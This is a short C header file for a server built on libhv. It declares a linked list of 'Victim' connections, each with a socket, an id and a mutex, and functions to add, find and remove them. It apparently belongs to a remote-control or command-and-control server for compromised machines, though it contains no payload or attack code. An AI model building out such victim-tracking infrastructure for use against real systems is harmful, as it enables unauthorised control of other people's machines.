//
// Created by cmtheit on 23-6-1.
//

#ifndef SERVER_VICTIM_H
#define SERVER_VICTIM_H
#include <hv/hloop.h>
#include <lib/result.h>


typedef struct Victim { // 一个受害者的连接
    int id;         // fd，标识一个io
    hio_t * io;     // 连接套接字
    struct Victim * next;   // 一个链表
    struct Victim ** pprev; // 双向链表，方便删除节点
    pthread_mutex_t lock;   // 互斥锁
} Victim, * VictimTable;

Victim * victim_new(hio_t * io);
void victim_free(Victim * victim);
void victim_on_close(hio_t * io);

extern VictimTable victims;
extern pthread_mutex_t victims_lock;

enum VictimsInitErrCode {
    VictimsInitErrOther,
};

typedef Result(enum VictimsInitErrCode, int) VictimsInitResult;

VictimsInitResult victims_init();

enum VictimsAddErrCode {
    VictimsAddErrOther,
    VictimsAddErrNew,          // 无法创建新对象
};

typedef Result(enum VictimsAddErrCode, int) VictimsAddResult;

VictimsAddResult victims_add(hio_t * io);
Victim * victim_get_by_io_ptr(hio_t * io);
Victim * victim_get_by_id(int id);
void victims_quit();

#endif //SERVER_VICTIM_H
